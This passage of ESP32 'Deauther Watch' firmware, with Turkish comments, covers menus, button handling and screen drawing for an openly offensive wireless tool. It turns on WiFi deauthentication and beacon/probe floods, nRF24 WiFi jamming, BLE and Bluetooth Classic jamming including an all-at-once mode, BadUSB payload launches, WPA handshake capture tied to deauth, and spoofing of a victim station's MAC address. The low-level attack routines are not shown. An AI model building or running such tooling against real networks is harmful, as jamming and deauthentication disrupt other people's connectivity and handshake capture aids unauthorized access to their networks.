  setMenu(menuCount++,"System Info", MODE_SYSTEM_INFO,0);
  // Fix #2: ESP-01 toggle — kullanıcı Settings'den aktif edebilir
  snprintf(buf,32,"%cESP-01 DAUTH%s",
    esp01UseDeauth?'*':' ',
    esp01Active?" [OK]":(esp01UseDeauth?" [NC]":" [OFF]"));
  setMenu(menuCount++,buf,MODE_SETTINGS,20);  // param=20 → toggle handler
  menuCursor=0; menuScroll=0;
}

// ============================================================
// Mode Change
// ============================================================
void changeMode(AppMode m) {
  prevMode = appMode;
  appMode  = m;
  menuCursor=0; menuScroll=0; scrollOffset=0;
  switch (m) {
    case MODE_MENU:            buildMainMenu();    break;
    case MODE_ATTACK_MENU:     buildAttackMenu();  break;
    case MODE_JAMMERS_MENU:    buildJammersMenu(); break;
    case MODE_SETTINGS:        buildSettingsMenu();break;
    case MODE_AP_LIST:         buildAPList();      break;
    case MODE_STA_LIST:        buildStationList(); break;
    case MODE_PROBE_LIST:      buildProbeList();   break;
    case MODE_SSID_LIST:       buildSSIDList();    break;
    case MODE_CHANNEL_ANALYZER:
      chScanState=0; chScanDone=false; chScanTimer=millis();
      memset(chApCount,0,sizeof(chApCount));
      memset(chAvgRssi,0,sizeof(chAvgRssi));
      break;
    case MODE_RSSI_TRACKER:
      memset(rssiRing,0,sizeof(rssiRing));
      rssiHead=0; rssiSamples=0;
      rssiMin=-100; rssiMax=-30; rssiSum=0;
      rssiTimer=millis();
      break;
    case MODE_DEAUTH_DETECTOR:
      esp_wifi_set_promiscuous(true);
      break;
    case MODE_BADUSB_MENU:
      buildBadusbMenu();
      break;
    case MODE_BADUSB_RUNNING:
      badusbRunning = true;
      badusbStatus[0] = 0;
      break;
    case MODE_BLE_MENU:
      buildBLEMenu();
      break;
    case MODE_BLE_SCAN:
      bleMenuCursor = 0; bleMenuScroll = 0;
      bleStartScan();
      break;
    case MODE_BLE_DEV_ATTACK:
      buildBLEDevAttackMenu();
      break;
    case MODE_BLE_RUNNING:
      bleAttacking = true;
      bleAtkIdx    = 0;
      bleAtkTimer  = 0;
      break;
    case MODE_BLE_JAM:
      bleJamStart();
      // ESP-01 ile 2.4GHz band interferans (BLE adv. kanallarını bozar)
      if (esp01Active) esp01SendBTInterference();
      break;
    case MODE_BT_CLASSIC_JAM:
      btClassicJamStart();
      // ESP-01 ile 2.4GHz beacon+probe flood (BT FHSS'i etkiler)
      if (esp01Active) esp01SendBTInterference();
      break;
    default: break;
  }
}

void goBack() {
  subMenuCtx=0;
  switch (appMode) {
    case MODE_AP_DETAIL:  changeMode(MODE_AP_LIST);      break;
    case MODE_AP_LIST:
    case MODE_STA_LIST:
    case MODE_PROBE_LIST:
    case MODE_SSID_LIST:  changeMode(MODE_MENU);         break;
    case MODE_ATTACK_MENU:
    case MODE_JAMMERS_MENU: changeMode(MODE_MENU);        break;
    case MODE_SETTINGS:   changeMode(MODE_MENU);         break;
    case MODE_MAC_SPOOFER:changeMode(MODE_SETTINGS);     break;
    case MODE_TX_RATE:    changeMode(MODE_SETTINGS);     break;
    case MODE_CHANNEL_SET:changeMode(MODE_SETTINGS);     break;
    case MODE_SYSTEM_INFO:changeMode(MODE_SETTINGS);     break;
    case MODE_PACKET_MONITOR:
    case MODE_CHANNEL_ANALYZER:
    case MODE_RSSI_TRACKER:
    case MODE_DEAUTH_DETECTOR:
    case MODE_CLOCK:      changeMode(MODE_MENU);         break;
    case MODE_HANDSHAKE_STATUS: changeMode(MODE_ATTACK_MENU); break;
    case MODE_ATTACK_RUNNING:
      attackRunning=false; attackFlags=0;
      // Fix #6: softAP açıksa önce kapat, sonra STA'ya geç — scan sonuçları bozulmasın
      WiFi.softAPdisconnect(true);
      delay(50);
      WiFi.mode(WIFI_STA); delay(100);
      esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
      esp_wifi_set_promiscuous_rx_cb(promisc_cb);
      if (nrfWifiJamActive && nrfInitDone) {
        dualRadioActive = false;
        nrfRadio.setPALevel(THERMAL_PA_SINGLE);
      }
      changeMode(MODE_ATTACK_MENU);
      break;
    case MODE_BADUSB_MENU:
      changeMode(MODE_MENU);
      break;
    case MODE_BADUSB_RUNNING:
      badusbRunning = false;
      changeMode(MODE_BADUSB_MENU);
      break;
    case MODE_BLE_MENU:
      changeMode(MODE_MENU);
      break;
    case MODE_BLE_SCAN:
      bleStopScan();
      changeMode(MODE_BLE_MENU);
      break;
    case MODE_BLE_DEV_ATTACK:
      changeMode(MODE_BLE_SCAN);
      break;
    case MODE_BLE_RUNNING:
      bleStopAttack();
      if (bleAtkMode == 1 || bleAtkMode == 2) changeMode(MODE_BLE_MENU);
      else changeMode(MODE_BLE_DEV_ATTACK);
      break;
    case MODE_BLE_JAM:
      bleJamStop();
      if (esp01Active) esp01Stop();
      changeMode(MODE_BLE_MENU);
      break;
    case MODE_BT_CLASSIC_JAM:
      btClassicJamStop();
      if (esp01Active) esp01Stop();
      changeMode(MODE_BLE_MENU);
      break;
    default: changeMode(MODE_MENU); break;
  }
}

// ============================================================
// Input handlers
// ============================================================
void handleUp() {
  switch (appMode) {
    case MODE_MENU:
    case MODE_ATTACK_MENU:
    case MODE_JAMMERS_MENU:
    case MODE_SETTINGS:
      if (menuCursor > 0) {
        menuCursor--;
        if (menuCursor < menuScroll) menuScroll = menuCursor;
      }
      break;
    case MODE_AP_LIST:
    case MODE_STA_LIST:
    case MODE_PROBE_LIST:
    case MODE_SSID_LIST:
      if (menuCursor > 0) {
        menuCursor--;
        if (menuCursor < menuScroll) menuScroll = menuCursor;
      }
      break;
    case MODE_PACKET_MONITOR:
      currentChannel = (currentChannel<13) ? currentChannel+1 : 1;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      break;
    case MODE_CLOCK:
      adjustClockHours(1);
      break;
    case MODE_TX_RATE:
      if (txRateIdx < 3) { txRateIdx++; saveSettings(); }
      buildSettingsMenu();
      break;
    case MODE_CHANNEL_SET:
      currentChannel = (currentChannel<13)?currentChannel+1:1;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      saveSettings();
      buildSettingsMenu();
      break;
    case MODE_BADUSB_MENU:
    case MODE_BLE_MENU:
    case MODE_BLE_DEV_ATTACK:
      if (menuCursor > 0) {
        menuCursor--;
        if (menuCursor < menuScroll) menuScroll = menuCursor;
      }
      break;
    case MODE_BLE_SCAN:
      if (bleMenuCursor > 0) {
        bleMenuCursor--;
        if (bleMenuCursor < bleMenuScroll) bleMenuScroll = bleMenuCursor;
      }
      break;
    case MODE_BLE_JAM:
      // Jam ekranında UP tuşu — sadece goBack tetikler (held), tek başına işlevsiz
      break;
    case MODE_BT_CLASSIC_JAM:
      break;
    default: break;
  }
}

void handleDown() {
  switch (appMode) {
    case MODE_MENU:
    case MODE_ATTACK_MENU:
    case MODE_JAMMERS_MENU:
    case MODE_SETTINGS:
      if (menuCursor < menuCount-1) {
        menuCursor++;
        if (menuCursor >= menuScroll+MENU_ROWS) menuScroll = menuCursor-MENU_ROWS+1;
      }
      break;
    case MODE_AP_LIST:
    case MODE_STA_LIST:
    case MODE_PROBE_LIST:
    case MODE_SSID_LIST:
      if (menuCursor < menuCount-1) {
        menuCursor++;
        if (menuCursor >= menuScroll+MENU_ROWS) menuScroll = menuCursor-MENU_ROWS+1;
      }
      break;
    case MODE_PACKET_MONITOR:
      currentChannel = (currentChannel>1)?currentChannel-1:13;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      break;
    case MODE_CLOCK:
      adjustClockMinutes(1);
      break;
    case MODE_TX_RATE:
      if (txRateIdx > 0) { txRateIdx--; saveSettings(); }
      buildSettingsMenu();
      break;
    case MODE_CHANNEL_SET:
      currentChannel = (currentChannel>1)?currentChannel-1:13;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      saveSettings();
      buildSettingsMenu();
      break;
    case MODE_BADUSB_MENU:
    case MODE_BLE_MENU:
    case MODE_BLE_DEV_ATTACK:
      if (menuCursor < menuCount - 1) {
        menuCursor++;
        if (menuCursor >= menuScroll + MENU_ROWS) menuScroll = menuCursor - MENU_ROWS + 1;
      }
      break;
    case MODE_BLE_JAM:
      break;
    case MODE_BT_CLASSIC_JAM:
      break;
    case MODE_BLE_SCAN: {
      int vc = bleVisibleCount();
      if (bleMenuCursor < vc - 1) {
        bleMenuCursor++;
        if (bleMenuCursor >= bleMenuScroll + 4) bleMenuScroll = bleMenuCursor - 3;
      }
      break;
    }
    default: break;
  }
}

void handleSelect() {
  switch (appMode) {
    case MODE_MENU: {
      if (menuCursor >= menuCount) return;
      int mparam  = menuItems[menuCursor].param;
      AppMode mtgt= menuItems[menuCursor].target;
      if (subMenuCtx==0 && mparam == 1) {
        subMenuCtx=1; buildScanMenu(); return;
      }
      if (subMenuCtx==0 && mparam == 2) {
        subMenuCtx=2; buildShowMenu(); return;
      }
      if (subMenuCtx==1) {
        handleScanMenuSelect(); subMenuCtx=0; return;
      }
      if (subMenuCtx==2) {
        changeMode(mtgt); subMenuCtx=0; return;
      }
      subMenuCtx=0;
      changeMode(mtgt);
      break;
    }
    case MODE_AP_LIST:
      if (menuCursor < apCount) {
        apList[menuCursor].selected = !apList[menuCursor].selected;
      }
      break;
    case MODE_STA_LIST:
      if (menuCursor < staCount)
        staList[menuCursor].selected = !staList[menuCursor].selected;
      break;
    case MODE_PROBE_LIST:
      if (menuCursor < probeCount) {
        // Add SSID to list
        addSSID(probeList[menuCursor].ssid, false);
      }
      break;
    case MODE_SSID_LIST: {
      if (menuCursor >= menuCount) return;
      int par = menuItems[menuCursor].param;
      if (par==10) { // CLONE APs
        for (int i=0;i<apCount;i++) {
          if (!apList[i].hidden) {
            bool wpa2=(apList[i].enc==WIFI_AUTH_WPA2_PSK||apList[i].enc==WIFI_AUTH_WPA3_PSK);
            addSSID(apList[i].ssid, wpa2);
          }
        }
        buildSSIDList();
      } else if (par==11) { // CLONE PROBES
        for (int i=0;i<probeCount;i++) {
          if (!probeList[i].wildcard) addSSID(probeList[i].ssid, false);
        }
        buildSSIDList();
      } else if (par==12) { // random mode: add batch of random SSIDs
        for (int k = 0; k < 5; k++) {
          char rnd[17];
          snprintf(rnd, 17, "SSID_%08lX", (unsigned long)esp_random());
          addSSID(rnd, false);
        }
        buildSSIDList();
      } else {
        int si = par;
        if (si>=0 && si<ssidCount) ssidList[si].selected = !ssidList[si].selected;
        buildSSIDList();
      }
      break;
    }
    case MODE_ATTACK_MENU: {
      if (menuCursor >= menuCount) return;
      int par = menuItems[menuCursor].param;
      AppMode tgt = menuItems[menuCursor].target;
      if (par==0) { attackFlags ^= ATK_DEAUTH; buildAttackMenu(); }
      else if (par==1) { attackFlags ^= ATK_BEACON; buildAttackMenu(); }
      else if (par==2) { attackFlags ^= ATK_PROBE;  buildAttackMenu(); }
      else if (par==3) {
        // nRF24 WiFi Jam toggle — seçili AP'nin kanalını kullan
        if (nrfWifiJamActive) {
          nrfWifiJamStop();
        } else {
          // Seçili AP'nin kanalını bul; yoksa currentChannel
          uint8_t jamWifiCh = currentChannel;
          for (int i = 0; i < apCount; i++) {
            if (apList[i].selected) { jamWifiCh = apList[i].channel; break; }
          }
          nrfWifiJamStart(jamWifiCh);
        }
        buildAttackMenu();
      }
      else if (par==4) {
        // ESP-01 deauth toggle — Fix #2: durum NVS'e kaydedilir
        esp01UseDeauth = !esp01UseDeauth;
        if (esp01UseDeauth && !esp01Active) {
          // Bağlantı henüz kurulmamış — şimdi dene
          esp01Init();
          // esp01Active, esp01Init() içinde set edilir
        }
        if (!esp01UseDeauth) {
          esp01Stop();  // ESP-01'e dur komutu gönder
        }
        saveSettings();  // Fix #2: tercihi kaydet — sonraki boot'ta hatırlanır
        buildAttackMenu();
      }
      else if (tgt == MODE_HANDSHAKE_STATUS) { changeMode(MODE_HANDSHAKE_STATUS); }
      else if (par==9) {
        if (attackFlags==0 && !esp01UseDeauth && !nrfWifiJamActive) break;
        if (bleAttacking) break;
        attackRunning=true; pktSent=0;
        // ESP-01 scan cache sıfırla — yeni saldırıda eski AP id geçersiz
        memset(esp01LastBssid, 0, 6);
        esp01LastCh     = 0;
        esp01LastApId   = -2;
        esp01ScanPending= false;
        // ESP32-S3 + IDF 5.x: WIFI_AP modu raw TX için gerekli.
        // softAP() çağrısı olmadan WIFI_IF_AP interface başlamaz —
        // esp_wifi_80211_tx ESP_ERR_INVALID_ARG döner, paket gitmez.
        WiFi.mode(WIFI_AP);
        WiFi.softAP("x", nullptr, currentChannel, 1);  // gizli AP, SSID broadcast yok
        delay(150);   // mode + softAP stabilizasyonu
        esp_wifi_set_ps(WIFI_PS_NONE);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        if (nrfWifiJamActive && nrfInitDone) {
          dualRadioActive = true;
          nrfRadio.setPALevel(THERMAL_PA_DUAL);
        }
        changeMode(MODE_ATTACK_RUNNING);
      } else if (par==10) {
        attackRunning=false;
        // Fix #6: softAP önce kapat
        WiFi.softAPdisconnect(true);
        delay(50);
        WiFi.mode(WIFI_STA); delay(100);
        esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
        if (nrfWifiJamActive && nrfInitDone) {
          dualRadioActive = false;
          nrfRadio.setPALevel(THERMAL_PA_SINGLE);
        }
        buildAttackMenu();
      }
      break;
    }
    case MODE_JAMMERS_MENU: {
      if (menuCursor >= menuCount) return;
      int par = menuItems[menuCursor].param;
      if (par == 1) { // nRF24 WiFi Jam
        if (nrfWifiJamActive) {
          nrfWifiJamStop();
        } else {
          uint8_t jamWifiCh = currentChannel;
          for (int i = 0; i < apCount; i++) {
            if (apList[i].selected) { jamWifiCh = apList[i].channel; break; }
          }
          nrfWifiJamStart(jamWifiCh);
        }
        buildJammersMenu();
      } else if (par == 2) { // BLE Jam
        if (bleJamming) {
          bleJamStop();
        } else {
          bleJamStart();
        }
        buildJammersMenu();
      } else if (par == 3) { // BT Classic Jam
        if (btClassicJamActive) {
          btClassicJamStop();
        } else {
          btClassicJamStart();
        }
        buildJammersMenu();
      } else if (par == 4) { // ALL JAMMERS (Tüm Jammer'lar Aynı Anda)
        bool allActive = (nrfWifiJamActive && bleJamming && btClassicJamActive);
        if (allActive) {
          // Hepsi açıksa hepsini kapat
          nrfWifiJamStop();
          bleJamStop();
          btClassicJamStop();
        } else {
          // Açık olmayanları başlat
          if (!nrfWifiJamActive) {
            uint8_t jamWifiCh = currentChannel;
            for (int i = 0; i < apCount; i++) {
              if (apList[i].selected) { jamWifiCh = apList[i].channel; break; }
            }
            nrfWifiJamStart(jamWifiCh);
          }
          if (!bleJamming) bleJamStart();
          if (!btClassicJamActive) btClassicJamStart();
        }
        buildJammersMenu();
      }
      break;
    }
    case MODE_ATTACK_RUNNING:
      attackRunning=false;
      WiFi.mode(WIFI_STA); delay(50);  // tarama için STA'ya dön
      esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
      esp_wifi_set_promiscuous_rx_cb(promisc_cb);
      if (nrfWifiJamActive && nrfInitDone) {
        dualRadioActive = false;
        nrfRadio.setPALevel(THERMAL_PA_SINGLE);
      }
      changeMode(MODE_ATTACK_MENU);
      break;
    case MODE_SETTINGS: {
      if (menuCursor >= menuCount) return;
      int par = menuItems[menuCursor].param;
      if (par == 20) {
        esp01UseDeauth = !esp01UseDeauth;
        if (esp01UseDeauth && !esp01Active) {
          esp01Init();
        }
        if (!esp01UseDeauth) {
          esp01Stop();
        }
        saveSettings();
        buildSettingsMenu();
      } else {
        changeMode(menuItems[menuCursor].target);
      }
      break;
    }
    case MODE_CHANNEL_ANALYZER:
      // Re-scan
      chScanState=0; chScanDone=false; chScanTimer=millis();
      memset(chApCount,0,sizeof(chApCount));
      break;
    case MODE_HANDSHAKE_STATUS:
      hsSniffActive = !hsSniffActive;
      if (hsSniffActive) {
        // Seçili AP'nin kanalını bul ve kilitle — deauth o kanalda kalır
        hsLockChannel = 0;
        for (int i = 0; i < apCount; i++) {
          if (apList[i].selected) { hsLockChannel = apList[i].channel; break; }
        }
        // Seçili AP yoksa ilk AP'in kanalını al
        if (hsLockChannel == 0 && apCount > 0) hsLockChannel = apList[0].channel;
        if (hsLockChannel != 0)
          esp_wifi_set_channel(hsLockChannel, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous(true);
      } else {
        hsLockChannel = 0;  // Kilit kaldır — deauth tüm kanallara serbestçe gönderebilir
      }
      break;
    case MODE_MAC_SPOOFER:
      // Fix #3: esp_wifi_set_mac WiFi aktifken çalışmıyor — ESP_ERR_WIFI_IF döner.
      // WiFi durdur → MAC değiştir → yeniden başlat.
      {
        static int spoofMode=0;
        spoofMode=(spoofMode+1)%4;
        uint8_t newMac[6];
        if (spoofMode==0) {
          memcpy(newMac, origMac,6);
          macSpoofed=false;
        } else if (spoofMode==1) {
          randomMAC(newMac);
          macSpoofed=true;
        } else if (spoofMode==2) {
          int oidx = esp_random()%OUI_COUNT;
          const OUIEntry& e = OUI_TABLE[oidx];
          memcpy(newMac, e.prefix,3);
          newMac[3]=(uint8_t)esp_random();
          newMac[4]=(uint8_t)esp_random();
          newMac[5]=(uint8_t)esp_random();
          macSpoofed=true;
        } else if (spoofMode==3) {
          bool found=false;
          for (int i=0;i<staCount;i++) {
            if (staList[i].selected) { memcpy(newMac,staList[i].mac,6); found=true; break; }
          }
          if (!found) { spoofMode=0; return; }
          macSpoofed=true;
        }
        memcpy(activeMac,newMac,6);
        // WiFi durdur, MAC değiştir, yeniden başlat
        esp_wifi_stop();
        delay(50);
        esp_wifi_set_mac(WIFI_IF_STA, newMac);
        esp_wifi_start();
        WiFi.mode(WIFI_STA);
        delay(100);
      }
      break;
    case MODE_CLOCK:
      syncTimeBLE();
      break;
      // SELECT'e basınca bir şey yapma, goBack ile çık
      break;
    case MODE_PACKET_MONITOR:
      changeMode(MODE_MENU);
      break;
    case MODE_BADUSB_MENU: {
      if (menuCursor >= menuCount) return;
      // Seçili payload'ı başlat
      badusbPayload  = menuItems[menuCursor].param;
      badusbRunning  = true;
      strlcpy(badusbStatus, "Hazirlanıyor...", 32);
      changeMode(MODE_BADUSB_RUNNING);
      break;
    }
    case MODE_BADUSB_RUNNING:
      // SELECT → iptal et ve geri dön
      badusbRunning = false;
      strlcpy(badusbStatus, "Iptal!", 32);
      changeMode(MODE_BADUSB_MENU);
      break;
    case MODE_BLE_MENU:
      // WiFi saldırısı aktifse engelle
      if (attackRunning) break;
      if (menuCursor < menuCount) {
        int par = menuItems[menuCursor].param;
        if (par > 0) bleAtkMode = par;
        changeMode(menuItems[menuCursor].target);
      }
      break;
    case MODE_BLE_SCAN:
      if (bleScanning) {
        // Tarama devam ediyor — dur ve listeyi göster
        bleStopScan();
      } else {
        // Tarama bitti — seçili cihaza git
        int ri = bleVisibleIdx(bleMenuCursor);
        if (ri >= 0) {
          bleSelectedDev = bleMenuCursor;
          changeMode(MODE_BLE_DEV_ATTACK);
        } else {
          // Cihaz yok — yeniden tara
          bleStartScan();
        }
      }
      break;
    case MODE_BLE_DEV_ATTACK: {
      if (menuCursor >= menuCount) break;
      int par = menuItems[menuCursor].param;
      if (par == 3) {
        // Listeden sil
        int ri = bleVisibleIdx(bleSelectedDev);
        if (ri >= 0) bleDevList[ri].hidden = true;
        changeMode(MODE_BLE_SCAN);
      } else {
        // Saldırı başlat
        bleAtkMode = par;
        changeMode(MODE_BLE_RUNNING);
      }
      break;
    }
    case MODE_BLE_RUNNING:
      // SELECT → durdur
      bleStopAttack();
      if (bleAtkMode == 1 || bleAtkMode == 2) changeMode(MODE_BLE_MENU);
      else changeMode(MODE_BLE_DEV_ATTACK);
      break;
    case MODE_BLE_JAM:
      // SELECT → durdur ve geri dön
      bleJamStop();
      changeMode(MODE_BLE_MENU);
      break;
    case MODE_BT_CLASSIC_JAM:
      // SELECT → durdur ve geri dön
      btClassicJamStop();
      changeMode(MODE_BLE_MENU);
      break;
    default: break;
  }
}

// ============================================================
// Screen Draw Functions
// ============================================================
// Custom RAM bitmap drawer (bypasses Adafruit_GFX pgm_read_byte Flash panic on ESP32-S3)
void drawBitmapRAM(int16_t x, int16_t y, const uint8_t *bitmap, int16_t w, int16_t h, uint16_t color) {
  int16_t byteWidth = (w + 7) / 8;
  for (int16_t j = 0; j < h; j++) {
    for (int16_t i = 0; i < w; i++) {
      if (bitmap[j * byteWidth + (i / 8)] & (128 >> (i & 7))) {
        display.drawPixel(x + i, y + j, color);
      }
    }
  }
}

// Custom RAM 5x7 text renderer (bypasses Adafruit_GFX pgm_read_byte Flash panic on ESP32-S3)
void drawStrRAM(int16_t x, int16_t y, const char* str, uint8_t size) {
  if (!str) return;
  int16_t curX = x;
  while (*str) {
    char c = *str++;
    if (c < 32 || c > 126) c = '?';
    uint8_t idx = c - 32;
    const uint8_t* cols = &dram_font_5x7[idx * 5];
    for (int col = 0; col < 5; col++) {
      uint8_t line = cols[col];
      for (int row = 0; row < 7; row++) {
        if (line & (1 << row)) {
          if (size == 1) {
            display.drawPixel(curX + col, y + row, SSD1306_WHITE);
          } else {
            fillRectRAM(curX + col * size, y + row * size, size, size, SSD1306_WHITE);
          }
        }
      }
    }
    curX += 6 * size;
  }
}

// Custom RAM line & rect drawers (bypasses Adafruit_GFX vtable Flash panics on ESP32-S3)
void drawLineRAM(int16_t x0, int16_t y0, int16_t x1, int16_t y1, uint16_t color) {
  int16_t dx = abs(x1 - x0), sx = x0 < x1 ? 1 : -1;
  int16_t dy = -abs(y1 - y0), sy = y0 < y1 ? 1 : -1;
  int16_t err = dx + dy, e2;
  while (true) {
    display.drawPixel(x0, y0, color);
    if (x0 == x1 && y0 == y1) break;
    e2 = 2 * err;
    if (e2 >= dy) { err += dy; x0 += sx; }
    if (e2 <= dx) { err += dx; y0 += sy; }
  }
}

void fillRectRAM(int16_t x, int16_t y, int16_t w, int16_t h, uint16_t color) {
  for (int16_t i = 0; i < w; i++) {
    for (int16_t j = 0; j < h; j++) {
      display.drawPixel(x + i, y + j, color);
    }
  }
}

void drawIntro() {
  Serial.println("DI: clear"); Serial.flush();
  display.clearDisplay();
  Serial.println("DI: logo"); Serial.flush();
  drawBitmapRAM(48, 2, WIFI_LOGO, 32, 32, SSD1306_WHITE);
  Serial.println("DI: text"); Serial.flush();
  drawStrRAM(40, 38, "DEAUTHER", 1);
  drawStrRAM(34, 48, "Watch v1.0", 1);
  Serial.println("DI: flush"); Serial.flush();
  safeDisplayFlush();
  Serial.println("DI: done"); Serial.flush();
}

void drawScanning() {
  display.clearDisplay();
  drawHeader("Scanning...");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(20,28);
  display.print(F("Please wait"));
  safeDisplayFlush();
}

void drawMenu() {
  Serial.println("DM: clear"); Serial.flush();
  display.clearDisplay();
  const char* title = "DEAUTHER WATCH";
  switch (appMode) {
    case MODE_ATTACK_MENU:  title="ATTACK"; break;
    case MODE_JAMMERS_MENU: title="JAMMERS"; break;
    case MODE_BLE_MENU:     title="BLE MENU"; break;
    case MODE_SETTINGS:     title="SETTINGS"; break;
    default: break;
  }
  Serial.println("DM: header"); Serial.flush();
  drawHeader(title);
  if (menuCount <= 0) {
    Serial.println("DM: empty"); Serial.flush();
    safeDisplayFlush();
    return;
  }
  Serial.println("DM: rows"); Serial.flush();
  int rem = menuCount - menuScroll;
  if (rem < 0) rem = 0;
  int rows = min((int)MENU_ROWS, rem);
  for (int i=0; i<rows; i++) {
    int idx = menuScroll + i;
    if (idx < 0 || idx >= menuCount) break;
    int y = 10 + i*11;
    char prefix[3] = "  ";
    if (idx == menuCursor) prefix[0] = '>';
    drawStrRAM(0, y, prefix);
    
    // Scroll long label if selected
    const char* lbl = menuItems[idx].label;
    int lblLen = strlen(lbl);
    if (idx==menuCursor && lblLen>17) {
      uint32_t now=millis();
      if (now-scrollTimer>=SCROLL_MS) { scrollOffset++; scrollTimer=now; }
      if (scrollOffset > lblLen-17) scrollOffset=0;
      char tmp[18]; memcpy(tmp, lbl+scrollOffset, 17); tmp[17]=0;
      drawStrRAM(12, y, tmp);
    } else {
      drawStrRAM(12, y, lbl);
    }
  }
  Serial.println("DM: scrollbar"); Serial.flush();
  // Scrollbar (0'a bölme korumalı)
  if (menuCount > MENU_ROWS && menuCount > 0) {
    int barH = 54*MENU_ROWS/menuCount;
    int barY = 10 + 54*menuScroll/menuCount;
    drawLineRAM(127,10,127,63,SSD1306_WHITE);
    fillRectRAM(126,barY,2,barH,SSD1306_WHITE);
  }
  Serial.println("DM: flush"); Serial.flush();
  safeDisplayFlush();
  Serial.println("DM: done"); Serial.flush();
}

void drawAPList() {
  display.clearDisplay();
  char hdr[20]; snprintf(hdr,20,"APs [%d]",apCount);
  drawHeader(hdr);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  if (apCount <= 0) {
    safeDisplayFlush();
    return;
  }
  if (menuCursor >= apCount) menuCursor = apCount - 1;
  if (menuCursor < 0) menuCursor = 0;
  if (menuScroll > menuCursor) menuScroll = menuCursor;
  if (menuCursor >= menuScroll + MENU_ROWS) menuScroll = menuCursor - MENU_ROWS + 1;
  if (menuScroll < 0) menuScroll = 0;

  int rows = min(MENU_ROWS, apCount - menuScroll);
  for (int i=0;i<rows;i++) {
    int idx=menuScroll+i;
    int y=10+i*11;
    display.setCursor(0,y);
    display.print(idx==menuCursor?'>':' ');
    display.print(apList[idx].selected?'*':' ');
    // SSID truncated to 14 chars
    char tmp[15]; memcpy(tmp,apList[idx].ssid,14); tmp[14]=0;
    display.print(tmp);
    // RSSI right-aligned
    char rssiStr[6]; snprintf(rssiStr,6,"%4d",apList[idx].rssi);
    display.setCursor(102,y); display.print(rssiStr);
  }
  safeDisplayFlush();
}

void drawStaList() {
  display.clearDisplay();
  char hdr[20]; snprintf(hdr,20,"STAs [%d]",staCount);
  drawHeader(hdr);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  if (staCount <= 0) {
    safeDisplayFlush();
    return;
  }
  if (menuCursor >= staCount) menuCursor = staCount - 1;
  if (menuCursor < 0) menuCursor = 0;
  if (menuScroll > menuCursor) menuScroll = menuCursor;
  if (menuCursor >= menuScroll + MENU_ROWS) menuScroll = menuCursor - MENU_ROWS + 1;
  if (menuScroll < 0) menuScroll = 0;

  int rows=min(MENU_ROWS, staCount-menuScroll);
  for (int i=0;i<rows;i++) {
    int idx=menuScroll+i;
    int y=10+i*11;
    display.setCursor(0,y);
    display.print(idx==menuCursor?'>':' ');
    display.print(staList[idx].selected?'*':' ');
    char mac[18]; macToStr(staList[idx].mac,mac);
    mac[11]=0; // show first 5 octets
    display.print(mac);
    display.print(' ');
    display.print(staList[idx].rssi);
  }
  safeDisplayFlush();
}

void drawProbeList() {
  display.clearDisplay();
  char hdr[20]; snprintf(hdr,20,"Probes [%d]",probeCount);
  drawHeader(hdr);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  int rows=min(MENU_ROWS, probeCount-menuScroll);
  for (int i=0;i<rows;i++) {
    int idx=menuScroll+i;
    int y=10+i*11;
    display.setCursor(0,y);
    display.print(idx==menuCursor?'>':' ');
    char tmp[16];
    if (probeList[idx].wildcard) strlcpy(tmp,"[Wildcard]",16);
    else { memcpy(tmp,probeList[idx].ssid,14); tmp[14]=0; }
    display.print(tmp);
    display.print(' ');
    display.print(probeList[idx].rssi);
  }
  safeDisplayFlush();
}

void drawSSIDList() {
  display.clearDisplay();
  char hdr[20]; snprintf(hdr,20,"SSIDs [%d]",ssidCount);
  drawHeader(hdr);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  int rows=min(MENU_ROWS, menuCount-menuScroll);
  for (int i=0;i<rows;i++) {
    int idx=menuScroll+i;
    int y=10+i*11;
    display.setCursor(0,y);
    display.print(idx==menuCursor?'>':' ');
    display.print(menuItems[idx].label);
  }
  safeDisplayFlush();
}

void drawAPDetail() {
  if (detailIdx<0||detailIdx>=apCount) return;
  APRecord &ap=apList[detailIdx];
  display.clearDisplay();
  char hdr[20]; snprintf(hdr,20,"AP Detail");
  drawHeader(hdr);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  char mac[18]; macToStr(ap.bssid,mac);
  display.setCursor(0,10); display.print(ap.ssid);
  display.setCursor(0,20); display.print(mac);
  char buf[24];
  snprintf(buf,24,"CH:%d  %s  %ddBm",ap.channel,encToStr(ap.enc),ap.rssi);
  display.setCursor(0,30); display.print(buf);
  snprintf(buf,24,"Vendor:%s",ap.vendor);
  display.setCursor(0,40); display.print(buf);
  if (ap.pmf) {
    display.setCursor(0,50);
    display.print(F("PMF ON-Deauth res."));
  } else {
    display.setCursor(0,50);
    display.print(F("PMF: OFF"));
  }
  safeDisplayFlush();
}

void drawAttackRunning() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  // Row 0: mode + rate
  char r0[22];
  const char* atkName="ATTACK";
  if (attackFlags&ATK_DEAUTH) atkName="DEAUTH";
  else if (attackFlags&ATK_BEACON) atkName="BEACON";
  else if (attackFlags&ATK_PROBE) atkName="PROBE";
  snprintf(r0,22,"%-7s %2d pkt/s",atkName,txRateOptions[txRateIdx]);
  display.setCursor(0,0); display.print(r0);
  // Flashing LIVE veya THROTTLE uyarısı
  uint32_t now=millis();
  if (thermalThrottle) {
    // Termal throttle aktif — yanıp sönen uyarı
    if (now-liveFlash>=400) { liveState=!liveState; liveFlash=now; }
    if (liveState) {
      display.setCursor(74,0); display.print(F("!!HOT!!"));
    }
  } else {
    if (now-liveFlash>=500) { liveState=!liveState; liveFlash=now; }
    if (liveState) {
      display.setCursor(80,0); display.print(F("**LIVE**"));
    }
  }
  // Row 1: SSID of first selected AP
  char r1[22]; r1[0]=0;
